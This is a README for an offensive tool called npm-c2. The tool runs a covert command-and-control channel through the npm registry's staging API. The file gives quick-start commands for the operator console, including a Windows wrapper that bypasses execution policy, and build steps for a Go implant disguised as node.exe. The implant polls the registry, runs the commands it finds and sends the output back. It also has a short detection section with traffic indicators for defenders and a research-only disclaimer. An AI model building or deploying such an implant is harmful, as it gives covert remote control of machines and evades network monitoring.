# npm-c2

A command channel that lives inside the npm registry: no server, no domain, no
certificate, no infrastructure. You create a package nobody has a reason to
install, write commands into it through the registry API, and the implant reads
them over the same HTTPS connection every developer laptop already makes.

Two transports exist in this repo. The original one used **dist-tags**, which
npm closed to automation tokens in 2025; it is documented in
[docs/legacy-dist-tags.md](docs/legacy-dist-tags.md). The current one uses the
**staging API**, the only write path npm still allows to a granular token with
bypass-2FA:

```
operator  --POST /-/stage/package/<pkg>-->  registry  <--GET /-/stage--  implant
             version string = payload                      version string = output
```

A staged version is `0.0.0-<channel>.<seq>.<kind>.<base32>`, which carries about
141 bytes per version and a handful of versions per command. Nothing but HTTPS
to `registry.npmjs.org`.

## Requirements

- Python 3.8 or newer (operator console)
- Go 1.21 or newer, only if you want to build the implant
- An npm account and one package you control
- A granular access token with permission to read staging and stage a publish

## Quick start, Linux and macOS

```sh
git clone https://github.com/<you>/npm-c2.git && cd npm-c2

export C2_PKG=your-package
export C2_TOKEN=$(cat ~/.npm-token)        # or create .c2token and chmod 600
export C2_PASS='a passphrase only you know' # must match the implant
export C2_CHAN=c0ff                        # 4 chars, first one a-f

./c2.sh                # interactive console
./c2.sh "whoami"       # one command and its output
```

The script creates `.venv` on first run and installs the package in it, so
nothing touches your system Python.

## Quick start, Windows

```powershell
setx C2_PKG your-package
setx C2_TOKEN npm_xxxxxxxx
setx C2_PASS "a passphrase only you know"
setx C2_CHAN c0ff

.\c2.cmd                 # from cmd.exe or Explorer
.\c2.ps1                 # from PowerShell, same thing
.\c2.ps1 "whoami"
```

`c2.cmd` just calls `c2.ps1` with `-ExecutionPolicy Bypass`, so you do not have
to change the machine policy. The first run creates `.venv` with the `py`
launcher and installs the package there.

## Configuration

| Variable | Meaning | Default |
|---|---|---|
| `C2_PKG` | package that carries the channel | none, required |
| `C2_CHAN` | 4-character channel id, first char `a`-`f` | `c0ff` |
| `C2_PASS` | channel passphrase; empty means plaintext | empty |
| `C2_TOKEN` | npm token; falls back to `.c2token` | none |
| `NPMC2_API_BASE` | registry base URL | `https://registry.npmjs.org` |

The channel id and the passphrase must match the ones baked into the implant.
The token is only used by the operator: the implant reads the staging list with
its own embedded credential.

## Build the implant

The implant is a Go binary that is renamed to `node.exe`, carries its whole
configuration at build time, and runs with no arguments:

```sh
python3 native/build_go.py \
  -p your-package \
  -t npm_xxxxxxxx \
  --stage-chan c0ff \
  --passphrase 'a passphrase only you know' \
  --interval 30 --jitter 5
```

That produces `native/dist/node.exe`. Building from Linux needs `gcc-mingw-w64`
for the icon and version resource; the prebuilt `.syso` files in `go/resource`
are used as a fallback. On the target it polls `/-/stage` every interval plus
jitter, runs what it finds, and writes the output back as staged versions.

## Tests

The suite is plain Python, no pytest, and does not touch the network: the
end-to-end tests run against a local mock registry.

```sh
python3 tests/test_stage_wire.py
python3 tests/test_e2e.py
python3 tests/test_encrypted_channel.py
python3 tests/test_bugs.py
python3 tests/test_operational.py
```

## Limits

- About 141 bytes of payload per staged version, ~4.5 KB per reply.
- One command per poll cycle; the operator polls every few seconds while waiting.
- Staged versions stay in the account. There is no delete API for them: a
  maintainer rejects them in the web UI, one at a time.
- The channel is slow and noisy by design. It is a research tool, not a
  replacement for a real C2 framework.

## Detection

Every request is HTTPS to an allowlisted host with an npm user agent, which is
the point. What gives it away is the shape: one package, a flat cadence, HTTP/2
under an npm client, a request with no `Accept` header, and staged versions
whose prerelease is a base32 blob instead of a build identifier. There is a
write-up with the traffic analysis and Sigma rules in the blog post this repo
came from.

## Legal

Published for research and for blue teams building detections. Run it against
your own accounts and your own lab. Using it against infrastructure you do not
own or have written permission to test is illegal in most jurisdictions and is
not the point of this repository.

## License

Apache License 2.0. See [LICENSE](LICENSE).
